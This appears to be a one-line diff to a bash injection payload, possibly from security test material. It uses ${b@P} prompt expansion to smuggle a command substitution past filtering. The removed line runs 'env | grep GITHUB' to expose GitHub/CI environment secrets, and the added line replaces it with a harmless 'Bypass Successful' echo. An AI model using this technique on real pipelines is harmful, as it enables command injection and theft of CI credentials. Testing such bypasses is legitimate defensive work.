@@ -1,1 +1,1 @@
-${a='$'}${b='$a(env | grep GITHUB)'}${b@P}
+${a='$'}${b='$a(echo "Bypass Successful")'}${b@P}
